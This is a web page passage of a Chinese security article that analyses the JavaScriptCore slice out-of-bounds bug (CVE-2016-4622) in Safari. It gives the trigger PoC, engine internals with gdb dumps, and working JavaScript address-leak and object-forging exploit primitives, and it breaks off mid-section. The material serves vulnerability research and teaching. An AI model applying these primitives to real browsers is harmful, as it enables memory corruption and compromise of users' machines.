<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>Safari浏览器JavaScript引擎JavaScriptCore的漏洞技术分析 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; Safari浏览器JavaScript引擎JavaScriptCore的漏洞技术分析评论Feed" href="http://www.mottoin.com/93615.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Yahoo 邮箱存储型XSS' href='http://www.mottoin.com/93559.html' />
<link rel='next' title='分析Linux/Mirai.B蠕虫' href='http://www.mottoin.com/93625.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=93615' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="JavaScriptCore,JavaScript引擎,Safari,漏洞利用技术">
<meta name="description" content="Author：KK(.a.k.a@4B5F5F4B)@玄武实验室来源：http://drops.wiki/index.php/2016/12/10/jscpwn/0x00前言SamuelGroß近日在phrack杂志上发表了一篇关于关于Safari浏览器JavaScript引擎JavaScriptCore的漏洞利用技术论文《AttackingJavaScriptEngines:Acasestudy">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-93615 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item current-post-ancestor"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-93615" class="post-93615 post type-post status-publish format-standard has-post-thumbnail hentry category--system tag-javascriptcore tag-javascript tag-safari tag-2185">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">Safari浏览器JavaScript引擎JavaScriptCore的漏洞技术分析</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/wooyundrops/">乌云知识库 Drops知识库</a>
                                <span class="dot">•</span>
                                <span>2016年12月11日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/article/system/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-system" rel="category tag">漏洞分析</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 1311</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <blockquote><p>Author：KK(.a.k.a @4B5F5F4B)@玄武实验室</p>
<p>来源：<a href="http://drops.wiki/index.php/2016/12/10/jscpwn/">http://drops.wiki/index.php/2016/12/10/jscpwn/</a></p></blockquote>
<h2>0x00 前言</h2>
<p>Samuel Groß近日在phrack杂志上发表了一篇关于关于Safari浏览器JavaScript引擎JavaScriptCore的漏洞利用技术论文《Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622》, 文章介绍了作者如何利用JavaScriptCore引擎的相关特性实现对一个越界访问漏洞的利用思路。出于对漏洞本身以及相关利用思路实现细节的好奇，本文作者尝试在不参考原作者所提供Exploit代码的前提下对其分享的利用思路进行“复盘”，通过这一过程不但理解了Exploit的实现细节，并且体会了exploiter在编写Exploit过程中的心路历程。于是特为此文。</p>
<h2>0x01 漏洞原理</h2>
<h3>1.1 PoC</h3>
<p>漏洞存在于JSC::arrayProtoFunSlice函数中，可以通过以下PoC触发</p>
<pre>var a = Array.apply(null, new Array(0x10000)).map(function () {return 0x13371337})
 var b = {“valueOf”: function (){
 a.length = 1
}}
a.slice(b, 6)</pre>
<h3>1.2 漏洞成因</h3>
<p>Array.prototype.slice函数原型如下，对一个数组调用slice方法会返回由原数组中从索引begin到end之间所有元素组成的一个新数组。</p>
<pre>arr.slice([begin [, end]])</pre>
<p>JSC::arrayProtoFunctionSlice函数首先会调用getLength得到当前数组的长度，并将其保存在栈上的临时变量length中。然后调用argumentClampedIndexFromStartOrEnd函数读取参数begin和end</p>
<pre>unsigned length = getLength(exec, thisObj);
if (UNLIKELY(vm.exception()))
 return JSValue::encode(jsUndefined());

unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);
 unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length);</pre>
<p>argumentClampedIndexFromStartOrEnd函数会调用toInteger函数将参数转换为double类型，这时如果传入的参数是一个对象并且重定义了“valueOf”方法，这个方法就会被调用。</p>
<pre>double indexDouble = value.toInteger(exec);
if (indexDouble &lt; 0) {
 indexDouble += length;
 return indexDouble &lt; 0 ? 0 : static_cast&lt;unsigned&gt;(indexDouble);
}
return indexDouble &gt; length ? length : static_cast&lt;unsigned&gt;(indexDouble);</pre>
<p>如果在重定义的valueOf方法中将数组的长度改小，如PoC中所示将数组a的长度改为1，这时在JSC::JSArray::setLength函数会调用reallocateAndShrinkButterfly函数为数组重新分配一块缓冲区保存数组中的数据，前提条件是数组的原长不小于64。</p>
<pre>unsigned lengthToClear = butterfly-&gt;publicLength() – newLength;
unsigned costToAllocateNewButterfly = 64; // a heuristic.
if (lengthToClear &gt; newLength &amp;&amp; lengthToClear &gt; costToAllocateNewButterfly) {
 reallocateAndShrinkButterfly(exec-&gt;vm(), newLength);
 return true;
}</pre>
<p>JSC::arrayProtoFuncSlice函数继续执行时，会调用JSC::JSArray::fastSlice函数从当前数组的数据缓冲区中复制数据，读取数据的起始位置由参数begin决定，复制数据的个数由（end-begin）决定。由于JSC::JSArray::fastSlice没有验证数据复制起始位置以及复制数据的个数是否会超出当前数组的实际长度，所以在valueOf回调函数已经将数组的实际长度改为1的情况下，调用memcpy函数会发越界访问。</p>
<pre>auto&amp; resultButterfly = *resultArray-&gt;butterfly();
if (arrayType == ArrayWithDouble)

memcpy(resultButterfly.contiguousDouble().data(),m_butterfly.get()-&gt;contiguousDouble().data() + startIndex,

sizeof(JSValue) * count);
else
memcpy(resultButterfly.contiguous().data(), m_butterfly.get()-&gt;contiguous().data() + startIndex, 
sizeof(JSValue) * count);</pre>
<h2>0x02 JSC引擎简介</h2>
<h3>2.1 JSValue</h3>
<p>在JavaScript中有以下六种数据类型</p>
<ul>
<li>Primitive data type</li>
<li>Boolean</li>
<li>null</li>
<li>undefined</li>
<li>number</li>
<li>string</li>
<li>Object</li>
</ul>
<p>定义以下数组</p>
<pre>var obj = {“prop1”: 0x1337, “prop2”: 1.337}
var foo = [true, false, null, undefined, 0x1337, 1.337, “1337”, obj]</pre>
<p>JSC会根据数据类型使用JSValue对数据进行编码存储</p>
<pre>0x7fb189a35330: 0x0000000000000007 0x0000000000000006
0x7fb189a35340: 0x0000000000000002 0x000000000000000a
0x7fb189a35350: 0xffff000000001337 0x3ff6645a1cac0831
0x7fb189a35360: 0x00007fb18977d2c0 0x00007fb1897e4f40</pre>
<pre>+ true: “`0x7“`
+ false: “`0x6“`
+ undefined: “`0xa“`
+ null: “`0x2“`
+ 0x1337: “`0xFFFF000000001337“` , 整数用二进制表示， 高16bit的模式“`FFFF:0000:IIII:IIII“`
+ 1.337: “`0x3ff6645a1cac0831“`, 浮点数用二进制表示，高16位的模式“`0001:****:****:****“`~“`FFFE:****:****:****“`
+ object: “`0x00007fb18977d2c0“`, 对象指针用二进制表示，高16bit的模式“`0000:PPPP:PPPP:PPPP“`</pre>
<h3>2.2 JSObject</h3>
<pre>var obj = {“prop1”: 0x1337, “prop2”: 1.337}</pre>
<p>这个对象在内存中布局如下：</p>
<pre>0x7fb1897e4f40: 0x010015000000014e 0x0000000000000000
0x7fb1897e4f50: 0xffff000000001337 0x3ff6645a1cac0831</pre>
<p>首8字节用于存储关于对象的JSCell信息，其中关键的信息包括：</p>
<pre>+ m_structureID: 0x14e

(gdb) x/2b &amp;(*(JSCell *)0x00007fb1897e4f40)-&gt;m_structureID
0x7fb1897e4f40: 0x4e 0x01

+ m_indexingType: 0x0

(gdb) x/1b &amp;(*(JSCell *)0x00007fb1897e4f40)-&gt;m_indexingType
0x7fb1897e4f44: 0x00

+ m_type: 0x15

(gdb) x/1b &amp;(*(JSCell *)0x00007fb1897e4f40)-&gt;m_type
0x7fb1897e4f45: 0x15

+ m_flags: 0x00
“`
(gdb) x/1b &amp;(*(JSCell *)0x00007fb1897e4f40)-&gt;m_flags
0x7fb1897e4f46: 0x00

+ m_cellState: 0x1

(gdb) x/1b &amp;(*(JSCell *)0x00007fb1897e4f40)-&gt;m_cellState
0x7fb1897e4f47: 0x01</pre>
<p>之后八字节存储Butterfly结构指针，Butterfly是一个类似数组用于存储对象属性值的数据结构。当对象的属性个数超过默认值6时，JSC就会为对象创建一个Butterfly来存储属性的值。由于当前对象只有两个属性，这两个属性的值以inline方式保存。</p>
<h3>2.3 Structures and Butterfly</h3>
<p>根据WebKit官方Blog中的描述信息，***Structure are a way to represent memory layout of properties on an object.*** ***in JSC object properties are stored in an array-like object called Butterfly**\*, 由此可见这两个结构用于描述对象属性，他们和对象的关系可以用下图描述。</p>
<p><img class="alignnone size-full wp-image-93618 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/12/453C92FA-532F-42CF-86A2-8CDE248FB161.jpg" alt="453c92fa-532f-42cf-86a2-8cde248fb161" width="1134" height="588" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/12/453C92FA-532F-42CF-86A2-8CDE248FB161.jpg 1134w, http://www.mottoin.com/wp-content/uploads/2016/12/453C92FA-532F-42CF-86A2-8CDE248FB161-300x156.jpg 300w, http://www.mottoin.com/wp-content/uploads/2016/12/453C92FA-532F-42CF-86A2-8CDE248FB161-768x398.jpg 768w, http://www.mottoin.com/wp-content/uploads/2016/12/453C92FA-532F-42CF-86A2-8CDE248FB161-1024x531.jpg 1024w" sizes="(max-width: 1134px) 100vw, 1134px" /></p>
<p>当访问对象中的某个属性时，JSC首先根据对象JSCell中保存的m\_structureID来查找能够描述该对象属性信息的Structure，然后用属性名称在Structure中查找该属性对应的offset，最后用offset在对象的Butterfly中读取属性的值。</p>
<h3>2.4 JSArray</h3>
<p>按照数据的存储方式(indexing type)，JSC中有以下6中不同类型的数组</p>
<pre>/*ArrayWithUndecied 3*/
var arrayUndecied = []
/*ArrayWithInt32 5*/
var arrayWithInt32 = Array.apply(null, new Array(0x100)).map(function () {return 0x1337})
/*ArrayWithDouble 7*/
var arrayWithDouble = Array.apply(null, new Array(0x100)).map(function () {return 1.337})
/*ArrayWithContiguous 9*/
var arrayWithContiguous = Array.apply(null, new Array(0x100)).map(function () {return {“prop”: 0x1337}})
/*ArrayWithArrayStorage 11*/
var arrayWithStorage = []
arrayWithStorage[0] = 0
arrayWithStorage[0x1337] = 0x1337
/*ArrayWithSlowPutArrayStorage 13*/
var arrayWithSlowPutArrayStorage = [0x1337, 1.337]
Array.prototype.__defineSetter__(“0”, function() {});</pre>
<h3>2.5 CopiedSpace</h3>
<p>在JSC使用MarkedSpace和CopiedSpace这两个堆进行内存管理。JSArray以及其他Javascript对象由MarkedSpace负责内存管理，Butterfly由CopiedSpace负责内存管理。当创建以下JSArray对象时，JSC调用CopiedAllocator::tryAllocate为数组a的Butterfly申请内存。</p>
<pre>var a = [0x41414141, 0x41414141, 0x41414141, 0x41414141]</pre>
<p>调用栈</p>
<pre>JSArray::tryCreateUninitialized
|
|–&gt;Heap::tryAllocateStorage
|
|–&gt;CopiedSpace::tryAllocate
|
|–&gt;CopiedAllocator::tryAllocate</pre>
<p>CopiedAllocator::tryAllocate申请内存算法非常简单——从当前剩余可用内存块中按需“切割”下所申请的内存</p>
<pre>size_t currentRemaining = m_currentRemaining;
if (bytes &gt; currentRemaining)
return false;
currentRemaining -= bytes;
m_currentRemaining = currentRemaining;
*outPtr = m_currentPayloadEnd – currentRemaining – bytes;</pre>
<p>所以如果连续创建数组，它们的butterfly在内存中也一定是连续分布的</p>
<pre>var a = [0x41414141, 0x41414141, 0x41414141, 0x41414141]
var b = [0x42424242, 0x42424242, 0x42424242, 0x42424242]
var c = [0x43434343, 0x43434343, 0x43434343, 0x43434343]</pre>
<p>内存布局</p>
<pre>(gdb) x/30gx 0x00007f3e48c814a0
0x7f3e48c814a0: 0x0000000400000004 0xffff000041414141
0x7f3e48c814b0: 0xffff000041414141 0xffff000041414141
0x7f3e48c814c0: 0xffff000041414141 0x0000000400000004
0x7f3e48c814d0: 0xffff000042424242 0xffff000042424242
0x7f3e48c814e0: 0xffff000042424242 0xffff000042424242
0x7f3e48c814f0: 0x0000000400000004 0xffff000043434343
0x7f3e48c81500: 0xffff000043434343 0xffff000043434343
0x7f3e48c81510: 0xffff000043434343 0x0000000000000000</pre>
<h2>0x03 漏洞利用</h2>
<h3>3.1 信息泄露</h3>
<p><strong>3.1.1 信息泄漏的基本思路</strong></p>
<p>利用JSC CopiedSpace在分配内存时内存块地址线性增长的这一特性，可以非常容易利用漏洞越界访问到攻击者希望读取的内存，从而实现信息泄漏。以下JS代码可以利用漏洞泄漏任意地址信息。</p>
<p><strong>3.1.2 信息泄漏的实现方法</strong></p>
<pre>function leak_obj(obj)
{
 /*create a ArrayWithDouble JSArray with butterfly of length 0x100*/
 var a = Array.apply(null, new Array(0x100)).map(function () { return 1.337; })
 var b = {“valueOf”: function () {
 /*reallocated a new butterfly of length 1*/
 a.length = 1
 /*create another butterfly filled with address to be leaked*/
 var c = [obj]
 return 4
}}
 var address = f64_to_uint(a.slice(b, 5))
 return address
}
var domobj = document.createElement(“canvas”)
log(“0x” + leak_obj(domobj).toString(16))</pre>
<p>在回调valueOf函数之前，数组a的Butterfly内存布局为</p>
<pre>(gdb) x/10gx thisObj-&gt;m_butterfly-&gt;m_value
0x7f3e1e21d068: 0x3ff5645a1cac0831 0x3ff5645a1cac0831
0x7f3e1e21d078: 0x3ff5645a1cac0831 0x3ff5645a1cac0831
0x7f3e1e21d088: 0x3ff5645a1cac0831 0x3ff5645a1cac0831
0x7f3e1e21d098: 0x3ff5645a1cac0831 0x3ff5645a1cac0831
0x7f3e1e21d0a8: 0x3ff5645a1cac0831 0x3ff5645a1cac0831</pre>
<p>回调valueOf函数之后，数组a的Butterfly内存布局为</p>
<pre>(gdb) x/10gx thisObj-&gt;m_butterfly-&gt;m_value
0x7f3e1e21d870: 0x3ff5645a1cac0831 0x3ff5645a1cac0831
0x7f3e1e21d880: 0x3ff5645a1cac0831 0x0000000400000001
0x7f3e1e21d890: 0x00007f3e1deda4c0 0x0000000000000000</pre>
<p>0x0007f3e1deda4c0 就是domobj对象的内存地址</p>
<pre>(gdb) info symbol *(long *)((long *)0x00007f3e1deda4c0+2)
WebCore::JSHTMLCanvasElement::s_info</pre>
<p>这里有一处值得注意的细节，在leak_obj函数中攻击者定义了一个ArrayWithDouble类型的数组。之所以要把数组a定义为ArrayWithDouble类型，是基于以下两方面考虑。第一，Array.prototype.slice函数返回的存放泄漏内存信息的数组类型由数组a决定。 第二，当我们通过索引0去访问通过越界读写入这个数组的对象指针时，在JSObject::getOwnPropertySlotByIndex函数中，会根据数组类型对读取的值进行不同方式的编码。</p>
<pre>case ArrayWithInt32:
case ArrayWithContiguous:{
 JSValue value = butterfly-&gt;contiguous()[i].get();
 if (value) {
 slot.setValue(thisObject, None, value);
 return true;
 }
 return false;
}

case ArrayWithDouble:{
 double value = butterfly-&gt;contiguousDouble()[i];
 if (value == value) {
 slot.setValue(thisObject, None, JSValue(JSValue::EncodeAsDouble, value));
 return true;
 }
}</pre>
<p>如果数组类型为ArrayWithInt32或者ArrayWithContiguous, 读取的值0x00007f3e1deda4c0会被当作是一个JSValue来处理。 这个值在JSValue的编码规则中是一个正常的对象指针，所以返回到脚本层得到的会是一个对象的引用。如果数组类型为ArrayWithDouble，读取的值0x00007f3e1deda4c0会被当作是一个double类型的变量来处理，这时在脚本层得到的就是一个经过编码的浮点数。通过对这个浮点数进行类型换换就能得到攻击者需要的内存地址信息。</p>
<pre>function f64_to_uint(f64)
{
 var bytes = new Uint8Array(new Float64Array([f64]).buffer)
 if(bytes.length != 8)
 {
 if(debug) log(“f64_to_u64 error.”)
 }
 var uint = 0
 for(var i=0; i&lt;bytes.length; i++)
 {
 uint += (bytes[bytes.length – i – 1] * Math.pow(2, 0x38 – i * 8))
 }
 return uint
}</pre>
<h3>3.2 伪造对象</h3>
<p><strong>3.2.1伪造对象的基本思路</strong></p>
<p>再回顾利用OOB实现信息泄漏的过程“`0x00007f3e1deda4c0“`本来是一个对象指针，但是攻击者却使JSC把它当作是double类型的变量来读取。可以说攻击者巧妙的把一个OOB漏洞转换成了一个类型混淆漏洞，而且既然攻击者可以让JSC把一个对象指针“混淆”成double，那么攻击者也就能够把一个double类型的变量让JSC“混淆”成一个对象指针。一旦如此，攻击者就能够在脚本层可以得到一个地址可控的“对象”的引用。</p>
<pre>function uint_to_f64(uint)
{
 var high = (uint / Math.pow(2, 0x20))
 var low = (uint &amp; 0xFFFFFFFF)
 var bytes = new Uint8Array((new Uint32Array([low, high]).buffer))
 var f64_array = new Float64Array(bytes.buffer)
 return f64_array[0]
}

function fake_obj(addr)
{
 var a = new Array(0x100)
 for(var i=0; i&lt;a.length; i++)
 {
 a[i] = 0x13371337
 }

var b = {“valueOf”: function () {
 var fake = uint_to_f64(addr)
 a.length = 1
 var c = [fake]
 return 4
 }}
 var obj = a.slice(b, 5)[0]
 return obj
}

/*suppose 0x133713371337 was an invalid address filled with fully controlled data*/
var obj = fake_obj(0x133713371337)</pre>
<p>在valueOf函数回调之前</p>
<pre>(gdb) x/10gx thisObj-&gt;m_butterfly-&gt;m_value
0x7fb0f0c3c730: 0xffff000000001337 0xffff000000001337
0x7fb0f0c3c740: 0xffff000000001337 0xffff000000001337
0x7fb0f0c3c750: 0xffff000000001337 0xffff000000001337
0x7fb0f0c3c760: 0xffff000000001337 0xffff000000001337
0x7fb0f0c3c770: 0xffff000000001337 0xffff000000001337</pre>
<p>在valueOf函数回调之后</p>
<pre>(gdb) x/10gx thisObj-&gt;m_butterfly-&gt;m_value
0x7fb0f0c3dfb8: 0xffff000000001337 0xffff000000001337
0x7fb0f0c3dfc8: 0xffff000000001337 0x0000000400000001
0x7fb0f0c3dfd8: 0x0000133713371337 0x7ff8000000000000
0x7fb0f0c3dfe8: 0x7ff8000000000000 0x7ff8000000000000
0x7fb0f0c3dff8: 0x0000000000000000 0x0000000000000000</pre>
<p><strong>3.2.2 伪造对象的实现方法</strong></p>
<p>之后需要解决的问题就是如何去构造一个合法的内存地址，它需要满足以下两个条件</p>
<ul>
